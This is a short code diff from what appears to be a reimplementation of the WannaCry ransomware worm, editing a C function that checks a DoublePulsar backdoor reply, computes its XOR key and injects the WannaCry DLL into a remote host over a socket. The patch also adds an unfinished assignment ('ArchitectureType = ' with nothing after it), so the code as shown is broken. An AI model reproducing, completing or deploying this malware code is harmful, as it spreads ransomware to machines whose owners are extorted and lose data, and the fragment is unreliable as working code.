@@ -165,8 +165,9 @@ int runPayloadOnTarget(char *host, u_short hostshort)
 	
 	if (recvbuff[34] == 0x51)
 	{
+		ArchitectureType = 
 		XorKey = ComputeDOUBLEPULSARXorKey(signature_long);
-		InjectWannaCryDLLViaDoublePulsarBackdoor(Socket, ArchitectureType, XorKey);
+		InjectWannaCryDLLViaDoublePulsarBackdoor(dsock, ArchitectureType, XorKey);
 	}
 	closesocket(dsock);
 	return 0;
